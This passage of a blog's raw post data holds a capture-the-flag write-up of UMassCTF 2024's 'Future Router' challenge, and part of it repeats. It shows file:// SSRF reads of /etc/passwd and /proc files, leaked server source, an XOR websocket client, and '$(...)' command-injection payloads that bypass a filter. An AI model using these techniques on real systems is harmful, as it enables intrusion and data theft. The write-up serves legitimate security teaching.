<code>krabby patty $(ls &gt; /tmp/output.txt)</code>. The response from the websocket server matched our expectations:</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Response <span class=\"keyword\">from</span> <span class=\"keyword\">server</span>: Thank you <span class=\"keyword\">for</span> your <span class=\"keyword\">input</span>, we will process your request <span class=\"keyword\">in</span> <span class=\"number\">1</span><span class=\"number\">-3</span> business days</span><br></pre></td></tr></table></figure>\n\n<p>Subsequently, reading the file from cURL using <code>file:///tmp/output.txt</code> yielded the desired response.</p>\n<p><img src=\"/./images/umass/ls.png\" alt=\"ls\"></p>\n<p>Let’s list the files of <code>/</code> using <code>krabby patty $(ls / &gt; /tmp/output.txt)</code> as input<br><img src=\"/./images/umass/lsroot.png\" alt=\"lsroot\"></p>\n<p>We can see the name of the flag file as <code>flag53958e73c5ba4a66</code>.</p>\n<p>We also attempted alternative approaches, such as accessing the hostname provided on the dashboard using the cURL route. However, the static source code did not provide any useful information in this regard.</p>\n<p>input &#x3D; <code>http://hostname:80/</code></p>\n<p>One example</p>\n<p><img src=\"/./images/umass/testing.png\" alt=\"testing\"></p>\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>Now just read the file using <code>krabby patty $(cat /flag53958e73c5ba4a66 &gt; /tmp/output.txt)</code></p>\n<p><img src=\"/./images/umass/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}</strong></p>\n<p>Thank You</p>\n","excerpt":"","more":"<h1 id=\"UMassCTF-2024\"><a href=\"#UMassCTF-2024\" class=\"headerlink\" title=\"UMassCTF 2024\"></a>UMassCTF 2024</h1><h1 id=\"Web-Future-Router\"><a href=\"#Web-Future-Router\" class=\"headerlink\" title=\"Web&#x2F;Future Router\"></a>Web&#x2F;Future Router</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p><code>Description</code> : Mr. Krabs just got a brand new router in the mail for him to use in the Krusty Krab. There was no mailing address so he’s tasked you with figuring out where the router is from and finding a flag!</p>\n<p>We were given access to a website at <a href=\"http://future-router.ctf.umasscybersec.org/\">this link</a>. </p>\n<p>So here is an image how the website looks like</p>\n<p><img src=\"/./images/umass/index.png\" alt=\"Index\"></p>\n<p>The site features three main routes:</p>\n<ul>\n<li>Dashboard –&gt; <code>/dash</code></li>\n<li>cURL –&gt; <code>/cURL</code></li>\n<li>FuTuR3 r0UT3R Customer Service –&gt; <code>/customerservice</code></li>\n</ul>\n<p><img src=\"/./images/umass/dash.png\" alt=\"dash\"></p>\n<p><img src=\"/./images/umass/curl.png\" alt=\"curl\"></p>\n<p><img src=\"/./images/umass/service.png\" alt=\"service\"></p>\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>So let’s analyse every route.</p>\n<ul>\n<li><p><code>dash</code> –&gt; Upon exploring the Dashboard route, we discovered information about three devices, each with a <code>hostname</code> and <code>port</code> specified.</p>\n<ul>\n<li><p>Hostname:patricks-rock,<br>Port - Service,<br>http:80</p>\n</li>\n<li><p>Hostname:spongebobs-spatula,<br>Port - Service,<br>http:80</p>\n</li>\n<li><p>Hostname:squidwards-clarinet,<br>Port - Service,<br>http:80</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>Attempts to access these devices via our browser were unsuccessful. However, we speculated that one of these devices might contain the email address mentioned in the challenge description. For now, we set this aside for further investigation.</p>\n<ul>\n<li><code>cURL</code> –&gt; The cURL route presented a simple tool for fetching URLs and displaying their responses.</li>\n</ul>\n<p>For example if we pass <code>www.google.com</code> as input displays the response from the specified URL.</p>\n<p><img src=\"/./images/umass/example.png\" alt=\"example\"></p>\n<p>We quickly realized that we could leverage this tool to read local files by utilizing the <code>file://</code> protocol. This allowed us to access sensitive system files such as <code>/etc/passwd</code>, indicating a potential security vulnerability.</p>\n<p><img src=\"/./images/umass/passwd.png\" alt=\"passwd\"></p>\n<p>At this moment I thought we have to find a flag.txt on the machine by hit and trial in every directory possible.</p>\n<p>But then I tried accessing <code>/proc/self/cmdline</code> as my second approach and we can see it is a python gunicorn gateway application.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># cmdline</span></span><br><span class=\"line\">/usr/local/bin/python/usr/local/bin/gunicorn-w4--bind0.0.0.0:8000app:app</span><br></pre></td></tr></table></figure>\n\n<p>Hence I tried reading the <code>app.py</code> in the current working directory using <code>file:///proc/self/cwd/app.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># app.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> blueprints.routes <span class=\"keyword\">import</span> httpserver</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"><span class=\"comment\"># This web server is the property of Sheldon J. Plankton, </span></span><br><span class=\"line\"><span class=\"comment\"># please refrain from reading this secret source code.</span></span><br><span class=\"line\"><span class=\"comment\"># I WILL USE THIS ROUTER TO STEAL THE SECRET KRABBY PATTY FORMULA!</span></span><br><span class=\"line\">app.register_blueprint(httpserver, url_prefix=<span class=\"string\">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>The source code is hidden somehow and we have to find the way to read it as mentioned in the comments of the <code>app.py</code></p>\n<p>When I tried to access <code>/proc/self/environ</code> it gave me the name of directory –&gt; <code>/planktonsrouter1ba8b69e</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># environ</span></span><br><span class=\"line\">OLDPWD=/PWD=/planktonsrouter1ba8b69e</span><br></pre></td></tr></table></figure>\n<p>As it is using blueprints we can read the source code through <code>file:///planktonsrouter1ba8b69e/blueprints/routes.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># routes.py</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, request, render_template, Blueprint,send_from_directory</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> pycurl </span><br><span class=\"line\"></span><br><span class=\"line\">httpserver = Blueprint(<span class=\"string\">&#x27;httpserver&#x27;</span>, __name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#@httpserver.route(&quot;/docs&quot;,methods=[&quot;GET&quot;])</span></span><br><span class=\"line\"><span class=\"comment\">#def docs():</span></span><br><span class=\"line\"><span class=\"comment\">#   return &quot;&quot;&quot;&lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;h1&gt;Router Docs&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;h2&gt;Websocket API&lt;/h2&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;strong&gt;<span class=\"doctag\">TODO:</span> Document how to talk to </span></span><br><span class=\"line\"><span class=\"comment\">#   Karen&#x27;s customer service module in ../karen/customerservice.py</span></span><br><span class=\"line\"><span class=\"comment\">#   Also figure out how to use supervisord better.&lt;/strong&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Securely CURL URLs, absolutely no bugs here!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/static/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">static</span>(<span class=\"params\">path</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> send_from_directory(<span class=\"string\">&#x27;static&#x27;</span>,path)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/cURL&quot;</span>,methods=[<span class=\"string\">&quot;GET&quot;</span>,<span class=\"string\">&quot;POST&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">curl</span>():</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.method == <span class=\"string\">&quot;GET&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;curl.html&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span>(request.method == <span class=\"string\">&quot;POST&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            buffer = BytesIO()</span><br><span class=\"line\">            c = pycurl.Curl()</span><br><span class=\"line\">            c.setopt(c.URL, request.json[<span class=\"string\">&#x27;URL&#x27;</span>])</span><br><span class=\"line\">            c.setopt(c.WRITEDATA, buffer)</span><br><span class=\"line\">            c.perform()</span><br><span class=\"line\">            c.close()</span><br><span class=\"line\">            DATA = buffer.getvalue()</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;success&quot;</span>:DATA.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;error&quot;</span>:<span class=\"built_in\">str</span>(e.with_traceback(<span class=\"literal\">None</span>))&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/customerservice&quot;</span>,methods=[<span class=\"string\">&quot;GET&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">customerservice</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;customerservice.html&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">NETWORK = [</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;hostname&#x27;</span>:<span class=\"string\">&#x27;patricks-rock&#x27;</span>,<span class=\"string\">&#x27;ports&#x27;</span>:[&#123;<span class=\"string\">&#x27;service&#x27;</span>:<span class=\"string\">&#x27;http&#x27;</span>,<span class=\"string\">&#x27;num&#x27;</span>:<span class=\"number\">80</span>&#125;]&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;hostname&#x27;</span>:<span class=\"string\">&#x27;spongebobs-spatula&#x27;</span>,<span class=\"string\">&#x27;ports&#x27;</span>:[&#123;<span class=\"string\">&#x27;service&#x27;</span>:<span class=\"string\">&#x27;http&#x27;</span>,<span class=\"string\">&#x27;num&#x27;</span>:<span class=\"number\">80</span>&#125;]&#125;,</span><br><span class=\"line\">    &#123;<span class=\"string\">&#x27;hostname&#x27;</span>:<span class=\"string\">&#x27;squidwards-clarinet&#x27;</span>,<span class=\"string\">&#x27;ports&#x27;</span>:[&#123;<span class=\"string\">&#x27;service&#x27;</span>:<span class=\"string\">&#x27;http&#x27;</span>,<span class=\"string\">&#x27;num&#x27;</span>:<span class=\"number\">80</span>&#125;]&#125;,</span><br><span class=\"line\"></span><br><span class=\"line\">]</span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/dash&quot;</span>,methods=[<span class=\"string\">&quot;GET&quot;</span>]</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dash</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&#x27;dashboard.html&#x27;</span>,network=NETWORK)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@httpserver.route(<span class=\"params\"><span class=\"string\">&quot;/&quot;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hello_world</span>():</span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>)   </span><br></pre></td></tr></table></figure>\n\n\n<p>We noticed a Python file mentioned in the comment <code>../karen/customerservice.py</code>. However, while we were solving, we found the file name using an alternative approach.</p>\n<p>Exploring the <code>/proc</code> directory, we experimented with different process IDs (PIDs).</p>\n<p>In <code>/proc/1/cmdline</code> we can see a bash script being run <code>entrypoint.sh</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># entrypoint.sh</span></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /planktonsrouter1ba8b69e</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Loop to monitor and restart Gunicorn if it crashes</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Restarting Gunicorn...&quot;</span></span><br><span class=\"line\">    gunicorn -w 4 --<span class=\"built_in\">bind</span> 0.0.0.0:8000 <span class=\"string\">&#x27;app:app&#x27;</span></span><br><span class=\"line\">    <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span> &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Loop to monitor and restart customerservice.py if it crashes</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    python3 karen/customerservice.py</span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">&quot;Restarting Customer Service...&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\"><span class=\"keyword\">done</span> &amp;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Loop to clean up old files in /tmp every 15 seconds</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">true</span>; <span class=\"keyword\">do</span></span><br><span class=\"line\">    find /tmp/* -<span class=\"built_in\">type</span> f -mmin +2 -<span class=\"built_in\">exec</span> <span class=\"built_in\">rm</span> -f &#123;&#125; +</span><br><span class=\"line\">    <span class=\"built_in\">sleep</span> 15</span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio, os, re</span><br><span class=\"line\"><span class=\"keyword\">from</span> websockets.server <span class=\"keyword\">import</span> serve</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Due to security concerns, I, Sheldon J. Plankton have ensured this module</span></span><br><span class=\"line\"><span class=\"comment\"># has no access to any internet service other than those that are</span></span><br><span class=\"line\"><span class=\"comment\"># trusted. This agent will trick Krabs into sending me the secret</span></span><br><span class=\"line\"><span class=\"comment\"># krabby patty formula which I will log into Karen&#x27;s secret krabby patty </span></span><br><span class=\"line\"><span class=\"comment\"># secret formula file! First, I have to fix a few security bugs!</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">KarenCustomerServiceAgent</span>:</span><br><span class=\"line\">    SECRET_KEY = <span class=\"built_in\">bytearray</span>(<span class=\"string\">b&quot;\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.&quot;</span>)</span><br><span class=\"line\">    Dialogue = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;Welcome&quot;</span>:<span class=\"string\">&quot;Hello! Welcome to the Future Router service bot!&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;Secret formula&quot;</span>:<span class=\"string\">&quot;Thank you for your input, we will process your request in 1-3 business days&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;Problem&quot;</span>:<span class=\"string\">&quot;Are you having an issue? Please enter the secret krabby patty formula in the dialogue box to continue&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">handle_input</span>(<span class=\"params\">self,message</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"string\">&quot;hello&quot;</span> <span class=\"keyword\">in</span> message):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.Dialogue[<span class=\"string\">&quot;Welcome&quot;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(<span class=\"string\">&quot;krabby patty&quot;</span> <span class=\"keyword\">in</span> message):</span><br><span class=\"line\">            filtered_message = re.sub(<span class=\"string\">r&quot;(\\&quot;|\\&#x27;|\\;|\\&amp;|\\|)&quot;</span>,<span class=\"string\">&quot;&quot;</span>,message)</span><br><span class=\"line\">            os.system(<span class=\"string\">f&#x27;echo &quot;<span class=\"subst\">&#123;filtered_message&#125;</span>\\n&quot; &gt;&gt; /dev/null&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.Dialogue[<span class=\"string\">&quot;Secret formula&quot;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(<span class=\"string\">&quot;problem&quot;</span> <span class=\"keyword\">in</span> message):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.Dialogue[<span class=\"string\">&quot;Problem&quot;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;I could not understand your message, this agent is under construction. Please use the other implemented features for now!&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">xor_decrypt</span>(<span class=\"params\">self,ciphertext</span>):</span><br><span class=\"line\">        plaintext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        cipher_arr = <span class=\"built_in\">bytearray</span>(ciphertext)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(cipher_arr)):</span><br><span class=\"line\">            plaintext += <span class=\"built_in\">chr</span>(cipher_arr[i] ^ self.SECRET_KEY[i % <span class=\"built_in\">len</span>(self.SECRET_KEY)])</span><br><span class=\"line\">        <span class=\"keyword\">return</span> plaintext</span><br><span class=\"line\"></span><br><span class=\"line\">KarenAgent = KarenCustomerServiceAgent()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">respond</span>(<span class=\"params\">websocket</span>):</span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">for</span> message <span class=\"keyword\">in</span> websocket:</span><br><span class=\"line\">        data = KarenAgent.xor_decrypt(message.encode(<span class=\"string\">&#x27;latin-1&#x27;</span>))</span><br><span class=\"line\">        response = KarenAgent.handle_input(data)</span><br><span class=\"line\">        <span class=\"keyword\">await</span> websocket.send(response)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> serve(respond, <span class=\"string\">&quot;0.0.0.0&quot;</span>, <span class=\"number\">9000</span>):</span><br><span class=\"line\">        <span class=\"keyword\">await</span> asyncio.Future()  <span class=\"comment\"># run forever</span></span><br><span class=\"line\"></span><br><span class=\"line\">asyncio.run(main())          </span><br></pre></td></tr></table></figure>\n\n<p>For now, let’s set aside this file and explore another functionality: <code>/customerservice</code>.</p>\n<p>This route hosts a websocket application. Despite attempting various inputs such as <code>hi</code> or <code>hello</code>, we encountered no success. This outcome was unsurprising upon reviewing the source code.</p>\n<p><img src=\"/./images/umass/ws.png\" alt=\"ws\"></p>\n<p>After analyzing the source code, we observed that the input is initially decoded using the <code>xor_decrypt</code> function before being passed into the <code>handle_input()</code> function.</p>\n<p>If the message contains <code>hello</code> after decryption, the application responds with the welcome message.</p>\n<p>Let’s proceed with a test.</p>\n<p>So here is our script</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> asyncio</span><br><span class=\"line\"><span class=\"keyword\">import</span> websockets</span><br><span class=\"line\"></span><br><span class=\"line\">SECRET_KEY = <span class=\"built_in\">bytearray</span>(<span class=\"string\">b&quot;\\xe1\\x86\\xb2\\xa0_\\x83B\\xad\\xd7\\xaf\\x87f\\x1e\\xb4\\xcc\\xbf...i will have the secret krabby patty formula.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">xor_encrypt</span>(<span class=\"params\">plaintext</span>):</span><br><span class=\"line\">    ciphertext = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(plaintext)):</span><br><span class=\"line\">        ciphertext += <span class=\"built_in\">chr</span>(plaintext[i] ^ SECRET_KEY[i % <span class=\"built_in\">len</span>(SECRET_KEY)])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ciphertext</span><br><span class=\"line\"></span><br><span class=\"line\">plaintext = <span class=\"string\">&quot;hello&quot;</span></span><br><span class=\"line\">ciphertext = xor_encrypt(plaintext.encode())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">def</span> <span class=\"title function_\">send_message</span>():</span><br><span class=\"line\">    uri = <span class=\"string\">&quot;ws://future-router.ctf.umasscybersec.org/app/&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># uri = &#x27;ws://0.0.0.0:9000/&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">async</span> <span class=\"keyword\">with</span> websockets.connect(uri) <span class=\"keyword\">as</span> websocket:</span><br><span class=\"line\">        <span class=\"keyword\">await</span> websocket.send(ciphertext)</span><br><span class=\"line\">        response = <span class=\"keyword\">await</span> websocket.recv()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Response from server:&quot;</span>, response)</span><br><span class=\"line\"></span><br><span class=\"line\">asyncio.run(send_message())</span><br></pre></td></tr></table></figure>\n\n<p>And bingo we get the welcome message in response</p>\n<p><img src=\"/./images/umass/welcome.png\" alt=\"welcome\"></p>\n<p>Upon further analysis of the code, we discovered a command injection vulnerability triggered when sending <code>krabby patty</code> in the message. Although the code includes some filters, they can be bypassed using <code>$(test_cmd)</code>. To view the response, we redirected the output of the command injection to a file and then accessed it using the cURL functionality.</p>\n<p>Let’s proceed with the command <code>krabby patty $(ls &gt; /tmp/output.txt)</code>. The response from the websocket server matched our expectations:</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Response <span class=\"keyword\">from</span> <span class=\"keyword\">server</span>: Thank you <span class=\"keyword\">for</span> your <span class=\"keyword\">input</span>, we will process your request <span class=\"keyword\">in</span> <span class=\"number\">1</span><span class=\"number\">-3</span> business days</span><br></pre></td></tr></table></figure>\n\n<p>Subsequently, reading the file from cURL using <code>file:///tmp/output.txt</code> yielded the desired response.</p>\n<p><img src=\"/./images/umass/ls.png\" alt=\"ls\"></p>\n<p>Let’s list the files of <code>/</code> using <code>krabby patty $(ls / &gt; /tmp/output.txt)</code> as input<br><img src=\"/./images/umass/lsroot.png\" alt=\"lsroot\"></p>\n<p>We can see the name of the flag file as <code>flag53958e73c5ba4a66</code>.</p>\n<p>We also attempted alternative approaches, such as accessing the hostname provided on the dashboard using the cURL route. However, the static source code did not provide any useful information in this regard.</p>\n<p>input &#x3D; <code>http://hostname:80/</code></p>\n<p>One example</p>\n<p><img src=\"/./images/umass/testing.png\" alt=\"testing\"></p>\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>Now just read the file using <code>krabby patty $(cat /flag53958e73c5ba4a66 &gt; /tmp/output.txt)</code></p>\n<p><img src=\"/./images/umass/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>UMASS{W3lC0m3_t0_Th3_FuTur3_Kr4bS_c28e1089b2}</strong></p>\n<p>Thank You</p>\n"},{"title":"corCTF 2023 